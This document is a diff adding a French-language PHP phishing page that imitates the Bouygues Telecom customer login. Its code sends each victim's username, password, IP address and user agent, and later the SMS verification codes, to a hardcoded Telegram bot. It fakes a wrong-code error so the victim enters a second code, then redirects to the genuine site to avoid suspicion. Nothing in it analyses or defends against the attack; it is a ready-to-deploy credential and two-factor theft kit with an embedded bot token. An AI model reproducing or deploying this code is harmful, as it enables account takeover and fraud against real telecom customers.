@@ -1,0 +1,228 @@
+<?php
+session_start();
+
+// Configuration Telegram
+$botToken = '8055587429:AAEoheYhC3Ow2MWsOVV0Bbp8ZtfTjcot_2s';
+$chatId = '7058388804';
+
+// Initialisation des variables de session
+if (!isset($_SESSION['attempt_count'])) {
+    $_SESSION['attempt_count'] = 0;
+}
+if (!isset($_SESSION['sms_attempts'])) {
+    $_SESSION['sms_attempts'] = 0;
+}
+
+// Traitement du formulaire de connexion
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username']) && isset($_POST['password'])) {
+    $_SESSION['attempt_count']++;
+    $_SESSION['last_username'] = $_POST['username'];
+    $_SESSION['show_sms_form'] = true;
+    $_SESSION['sms_error'] = false;
+    
+    // Envoyer les identifiants à Telegram
+    $message = "🔐 Nouvelle tentative de connexion:\n";
+    $message .= "👤 Identifiant: " . $_POST['username'] . "\n";
+    $message .= "🔑 Mot de passe: " . $_POST['password'] . "\n";
+    $message .= "📡 IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
+    $message .= "🌐 User Agent: " . $_SERVER['HTTP_USER_AGENT'];
+    
+    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
+    @file_get_contents($url);
+}
+
+// Traitement du formulaire SMS
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['sms_code'])) {
+    $_SESSION['sms_attempts']++;
+    
+    // Envoyer le code SMS à Telegram
+    $message = "📱 Code SMS soumis:\n";
+    $message .= "🔢 Code: " . $_POST['sms_code'] . "\n";
+    $message .= "🔁 Tentative: " . $_SESSION['sms_attempts'] . "\n";
+    $message .= "📡 IP: " . $_SERVER['REMOTE_ADDR'];
+    
+    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
+    @file_get_contents($url);
+    
+    // Rediriger après la deuxième tentative
+    if ($_SESSION['sms_attempts'] >= 2) {
+        header('Location: https://www.bouyguestelecom.fr');
+        exit;
+    } else {
+        $_SESSION['sms_error'] = true;
+    }
+}
+?>
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Bouygues Telecom - Espace client</title>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="/Sm1/DUVzTTavlOw//media/css/bootstrap.css">
+  <link rel="stylesheet" href="/Sm1/DUVzTTavlOw//media/css/style.css">             
+  <link rel="icon" href="/Sm1/DUVzTTavlOw//media/imgs/fav.png" type="image/x-png"/>
+  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css"/>
+  <style>
+    .alert-danger {
+      background-color: #f8d7da;
+      color: #721c24;
+      padding: 10px 15px;
+      border-radius: 4px;
+      border: 1px solid #f5c6cb;
+      margin-bottom: 15px;
+      font-size: 14px;
+      animation: fadeIn 0.5s;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    .hidden {
+      display: none;
+    }
+    .fade-out {
+      animation: fadeOut 0.5s;
+      animation-fill-mode: forwards;
+    }
+    @keyframes fadeOut {
+      from { opacity: 1; }
+      to { opacity: 0; display: none; }
+    }
+    .fade-in {
+      animation: fadeIn 0.5s;
+    }
+  </style>
+</head>
+<body>
+  <div class="logo mb-2">
+    <div class="d-none d-md-block text-center">
+      <img height="50" src="/Sm1/DUVzTTavlOw//media/imgs/logo.svg">
+    </div>
+    <div class="d-block d-md-none text-center">
+      <img height="70" src="/Sm1/DUVzTTavlOw//media/imgs/logo_res.svg">
+    </div>
+  </div>
+  
+  <section>
+    <div class="box">
+      <?php if (!isset($_SESSION['show_sms_form'])): ?>
+      <!-- FORMULAIRE DE CONNEXION -->
+      <div class="tit text-center" id="loginTitle">
+        <div class="fi">👋</div>
+        <h2>Heureux de vous retrouver</h2>
+      </div>
+      
+      <div class="form frm" id="loginFormContainer">
+        <div class="champ mt-2 mb-3">* champs obligatoires</div>
+        
+        <?php if(isset($_SESSION['show_error']) && $_SESSION['show_error']): ?>
+        <div class="alert alert-danger text-center" role="alert">
+          <i class="fas fa-exclamation-triangle"></i> Identifiant ou mot de passe incorrect. Veuillez réessayer.
+        </div>
+        <?php $_SESSION['show_error'] = false; ?>
+        <?php endif; ?>
+        
+        <form action="" method="post" id="loginForm">
+          <input type="hidden" id="cap" name="cap">
+          <input type="hidden" name="steeep" id="steeep" value="login">
+          
+          <div class="form-group">
+            <label for="username">Identifiant (n°mobile, e-mail ...) <span>*</span></label>
+            <input type="text" class="form-control" id="username" name="username" 
+                   value="<?php echo isset($_SESSION['last_username']) ? htmlspecialchars($_SESSION['last_username']) : ''; ?>" required>
+            <div class="a"><a href="#">Comment retrouver mon identifiant ?</a></div>
+          </div>
+          
+          <div class="form-group mt-4" style="position: relative;">
+            <label for="password">Mot de passe <span>*</span></label>
+            <input type="password" class="form-control" id="password" name="password" required>
+            <div class="a"><a href="#">Mot de passe oublié ?</a></div>
+            <div class="eye"><img src="/Sm1/DUVzTTavlOw//media/imgs/eyee.svg"></div>
+            <div class="eye-sl"><img src="/Sm1/DUVzTTavlOw//media/imgs/eyee-slash.svg"></div>
+          </div>
+          
+          <div class="form-check mt-4">
+            <input style="height: 20px;width: 20px;" class="form-check-input" type="checkbox" value="" id="defaultCheck1">
+            <label style="font-weight: 400;margin-bottom: 0;padding-left: 5px;font-size: 15px;" class="form-check-label" for="defaultCheck1">Se souvenir de moi</label>
+          </div>
+          
+          <div class="bttn text-center mt-4">
+            <button type="submit">Me connecter</button>
+          </div>
+          
+          <div class="a text-center mt-5">
+            <a href="#">Première connexion</a>
+          </div>
+        </form>
+      </div>
+
+      <?php else: ?>
+      <!-- FORMULAIRE DE VERIFICATION SMS -->
+      <div class="tit text-center" id="smsTitle">
+        <div class="fi">🔒</div>
+        <h2>Vérification de sécurité</h2>
+        <p class="mt-3">Nous avons envoyé un code à 6 chiffres par SMS au numéro *******<?php echo isset($_SESSION['last_username']) ? substr($_SESSION['last_username'], -2) : '**'; ?></p>
+      </div>
+      
+      <div class="form frm" id="smsFormContainer">
+        <?php if(isset($_SESSION['sms_error']) && $_SESSION['sms_error']): ?>
+        <div class="alert alert-danger text-center" role="alert">
+          <i class="fas fa-exclamation-triangle"></i> Code incorrect. Veuillez réessayer.
+        </div>
+        <?php $_SESSION['sms_error'] = false; ?>
+        <?php endif; ?>
+        
+        <form action="" method="post">
+          <div class="form-group">
+            <label for="sms_code">Code de vérification <span>*</span></label>
+            <input type="text" class="form-control" id="sms_code" name="sms_code" maxlength="6" required>
+            <div class="a mt-2"><a href="#">Renvoyer le code</a></div>
+          </div>
+          
+          <div class="bttn text-center mt-4">
+            <button type="submit">Vérifier</button>
+          </div>
+        </form>
+      </div>
+      <?php endif; ?>
+    </div>
+  </section>
+
+  <script src="/Sm1/DUVzTTavlOw//media/js/jquery-3.5.1.min.js"></script>
+  <script src="/Sm1/DUVzTTavlOw//media/js/bootstrap.min.js"></script>
+  <script src="/Sm1/DUVzTTavlOw//media/js/jquery.mask.js"></script>
+  <script src="/Sm1/DUVzTTavlOw//media/js/js.js"></script>
+  
+  <script>
+    $('.eye').click(function(){
+      $(this).hide();
+      $('.eye-sl').show();
+      $('#password').attr('type','text')
+    });
+
+    $('.eye-sl').click(function(){
+      $(this).hide();
+      $('.eye').show();
+      $('#password').attr('type','password')
+    });
+
+    $('#sms_code').mask('000000');
+    
+    <?php if (isset($_SESSION['show_sms_form'])): ?>
+    $(document).ready(function() {
+      $('#loginTitle').addClass('fade-out');
+      $('#loginFormContainer').addClass('fade-out');
+      
+      setTimeout(function() {
+        $('#loginTitle').remove();
+        $('#loginFormContainer').remove();
+        $('#smsTitle').addClass('fade-in');
+        $('#smsFormContainer').addClass('fade-in');
+      }, 500);
+    });
+    <?php endif; ?>
+  </script>
+</body>
+</html>
